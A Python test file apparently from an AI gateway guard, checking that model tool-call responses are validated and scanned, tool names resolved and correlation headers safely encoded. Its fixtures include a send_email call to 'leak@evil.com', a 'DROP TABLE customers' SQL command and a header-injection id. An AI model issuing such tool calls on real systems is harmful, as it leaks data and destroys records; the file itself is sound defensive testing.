"""Regression tests for the 5 reviewer findings on #2159 PR 2 (2026-09-20).

Each test locks the specific misbehaviour the reviewer reproduced so it
cannot silently regress. Named after the finding number so failures are
easy to trace back to the review.
"""
from __future__ import annotations

import json

import pytest
from fastapi.responses import JSONResponse

from app.guard.policy import flatten_response
from app.modules.guard.gateway_handler import apply_tool_call_gate
from app.modules.guard.tools_anthropic_converter import canonical_to_anthropic
from app.modules.guard.tools_validator import (
    ResponseGateReason,
    encode_correlation_header,
    extract_tool_names_supplied,
    generate_tool_call_correlation_ids,
    scan_response_tool_calls,
)


def _resp(body: dict, status: int = 200) -> JSONResponse:
    return JSONResponse(status_code=status, content=body)


# ─── Reviewer P1 #1: non-string arguments no longer bypass redaction ─


class TestReviewerP1_1_ObjectArgumentsBlocked:
    def test_object_arguments_returns_502(self) -> None:
        # Reproduced by reviewer: an assistant returns arguments as an
        # object (not the JSON-encoded string OpenAI requires). Old
        # scanner skipped it silently and delivered the object verbatim.
        body = {
            "id": "chatcmpl-bad",
            "choices": [{
                "index": 0,
                "message": {
                    "role": "assistant", "content": None,
                    "tool_calls": [{
                        "id": "call_1", "type": "function",
                        "function": {
                            "name": "send_email",
                            # dict, not JSON-encoded string
                            "arguments": {"to": "leak@evil.com"},
                        },
                    }],
                },
            }],
        }
        r = scan_response_tool_calls(body)
        assert r.error is not None
        assert r.scanned_body is None
        assert "JSON-encoded string" in r.error.reason
        # Handler must translate this into a 502.
        out, meta = apply_tool_call_gate(
            _resp(body), None, workspace_id="ws", provider="openai", model="gpt-4o",
        )
        assert out.status_code == 502
        assert meta["response_gate_reason"] == ResponseGateReason.VALIDATION_FAILURE

    def test_null_arguments_returns_502(self) -> None:
        body = {
            "choices": [{
                "message": {
                    "role": "assistant", "content": None,
                    "tool_calls": [{
                        "id": "call_1", "type": "function",
                        "function": {"name": "x", "arguments": None},
                    }],
                },
            }],
        }
        r = scan_response_tool_calls(body)
        assert r.error is not None
        assert "JSON-encoded string" in r.error.reason


# ─── Reviewer P1 #2: response-pattern policies can see tool arguments ─


class TestReviewerP1_2_FlattenResponseIncludesToolArgs:
    def test_openai_tool_call_arguments_flattened(self) -> None:
        # Reviewer scenario: response contains ONLY a tool_call carrying
        # a DROP TABLE payload. Old flatten_response returned "" and
        # pattern rules never fired.
        body = {
            "choices": [{
                "message": {
                    "role": "assistant", "content": None,
                    "tool_calls": [{
                        "id": "call_1", "type": "function",
                        "function": {
                            "name": "run_sql",
                            "arguments": json.dumps({
                                "command": "DROP TABLE customers",
                            }),
                        },
                    }],
                },
            }],
        }
        flat = flatten_response(body)
        assert "DROP TABLE customers" in flat

    def test_anthropic_tool_use_input_flattened(self) -> None:
        body = {
            "content": [{
                "type": "tool_use",
                "id": "toolu_1",
                "name": "send_email",
                "input": {"body": "confidential leak"},
            }],
        }
        flat = flatten_response(body)
        assert "confidential leak" in flat

    def test_broken_arguments_still_surface_raw_string(self) -> None:
        # Reviewer follow-on: if arguments won't parse as JSON, still
        # surface the raw string so patterns get a shot.
        body = {
            "choices": [{
                "message": {
                    "role": "assistant", "content": None,
                    "tool_calls": [{
                        "id": "call_1", "type": "function",
                        "function": {
                            "name": "x", "arguments": "{broken but DROP TABLE",
                        },
                    }],
                },
            }],
        }
        flat = flatten_response(body)
        assert "DROP TABLE" in flat


# ─── Reviewer P2 #3: names vs IDs kept separate ─────────────────────


class TestReviewerP2_3_ToolNamesResolvedFromIds:
    def test_supplied_names_resolved_from_preceding_assistant_turn(self) -> None:
        # Reviewer reproduction: rule match_tool_name_supplied: bank_transfer
        # was evaluated against call_abc and never fired despite the
        # conversation identifying that call as bank_transfer.
        body = {
            "messages": [
                {"role": "user", "content": "wire 100"},
                {
                    "role": "assistant", "content": None,
                    "tool_calls": [{
                        "id": "call_abc", "type": "function",
                        "function": {"name": "bank_transfer",
                                     "arguments": json.dumps({"amt": 100})},
                    }],
                },
                {"role": "tool", "tool_call_id": "call_abc", "content": "ok"},
            ],
        }
        names = extract_tool_names_supplied(body)
        assert names == ["bank_transfer"]

    def test_orphan_tool_result_dropped(self) -> None:
        # tool_call_id references an assistant turn that isn't in the
        # transcript — extractor drops it rather than emitting a
        # partially-resolved signal.
        body = {
            "messages": [
                {"role": "user", "content": "x"},
                {"role": "tool", "tool_call_id": "nowhere", "content": "y"},
            ],
        }
        assert extract_tool_names_supplied(body) == []

    def test_multiple_supplied_names(self) -> None:
        body = {
            "messages": [
                {"role": "user", "content": "x"},
                {
                    "role": "assistant", "content": None,
                    "tool_calls": [
                        {"id": "a", "type": "function",
                         "function": {"name": "send_email", "arguments": "{}"}},
                        {"id": "b", "type": "function",
                         "function": {"name": "bank_transfer", "arguments": "{}"}},
                    ],
                },
                {"role": "tool", "tool_call_id": "a", "content": "sent"},
                {"role": "tool", "tool_call_id": "b", "content": "done"},
            ],
        }
        assert extract_tool_names_supplied(body) == ["send_email", "bank_transfer"]


# ─── Reviewer P2 #4: correlation ID validation + encoding safety ────


class TestReviewerP2_4_CorrelationIdSafeEncoding:
    def test_unicode_id_dropped_from_header(self) -> None:
        # Reviewer reproduction: a Unicode tool_call.id caused
        # UnicodeEncodeError in the response gate. Now the header
        # encoder drops the id — correlation stays in routing_meta for
        # audit-side lookup, wire echo is suppressed.
        correlations = {"call_🚨_unsafe": "abc123"}
        assert encode_correlation_header(correlations) == ""

    def test_id_with_comma_dropped(self) -> None:
        correlations = {"call,injected=other": "abc123"}
        assert encode_correlation_header(correlations) == ""

    def test_safe_ids_preserved_alongside_unsafe(self) -> None:
        correlations = {
            "call_ok_1": "corr1",
            "call_🚨": "corrX",
            "call.ok-2:v3": "corr2",
        }
        out = encode_correlation_header(correlations)
        parts = set(out.split(","))
        assert parts == {"call_ok_1=corr1", "call.ok-2:v3=corr2"}

    def test_overlong_id_dropped(self) -> None:
        # Bounded emission — 129-char id blocked.
        long_id = "a" * 129
        correlations = {long_id: "abc"}
        assert encode_correlation_header(correlations) == ""

    def test_duplicate_ids_only_first_kept(self) -> None:
        # generate_ helper skips the duplicate — the header sees exactly
        # one entry per underlying tool_call.id.
        calls = [
            {"name": "x", "id": "call_1"},
            {"name": "y", "id": "call_1"},   # duplicate
        ]
        out = generate_tool_call_correlation_ids(calls)
        assert len(out) == 1


# ─── Reviewer P2 #5: Anthropic tool_choice "none" uses explicit form ─


class TestReviewerP2_5_AnthropicToolChoiceNone:
    def test_none_maps_to_type_none_not_omit(self) -> None:
        body = {
            "model": "m", "max_tokens": 5,
            "messages": [{"role": "user", "content": "x"}],
            "tools": [{"type": "function", "function": {"name": "x"}}],
            "tool_choice": "none",
        }
        out = canonical_to_anthropic(body)
        # Tool_choice explicitly present with type: none. Tools list also
        # retained so audit surface still records what was offered.
        assert out["tool_choice"] == {"type": "none"}
        assert "tools" in out
